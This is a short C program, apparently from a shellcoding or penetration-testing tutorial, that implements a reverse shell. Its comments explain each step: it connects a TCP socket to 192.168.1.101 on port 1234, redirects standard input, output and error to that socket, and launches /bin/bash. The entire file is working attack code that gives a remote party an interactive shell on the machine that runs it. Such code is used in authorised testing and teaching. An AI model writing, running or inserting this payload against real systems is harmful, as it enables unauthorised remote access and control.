#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

int main(void)
{
  int i; //for later use in fd replication
  int sockfd; //this will hold the file descriptor of our socket
  struct sockaddr_in sock_addr; // the socket requires passing the target address and port.
  //It accepts that data formed into a structure of type sockaddr_in. Before we use that structure, we need to declare it.
  //now, we define the elements of the structure that will contain socket properties
  sock_addr.sin_family = AF_INET; // address family - internet protocol address (IP)
  sock_addr.sin_port = htons(1234); // target port. function htons() converts it to network byte order in similar way as we need to convert data passed to memory to littleendian
  sock_addr.sin_addr.s_addr = inet_addr("192.168.1.101"); // target ip, also adjusted to meet network byte order requirements.
  // Socket is created and reference to it is held in sockfd variable.
  sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP);
  // Socket is put in connect state accordingly to properties set in sock_addr structure
  connect(sockfd, (struct sockaddr *)&sock_addr, sizeof(sock_addr));
  // we want to duplicate all the file descriptors related to I/O (so number 0,1,2), and we do it using a loop
  for(i = 0; i <= 2; i++)
    dup2(sockfd, i);
  // spawn the bash shell
  execl( "/bin/bash", "sh", NULL );
  return 0;
}
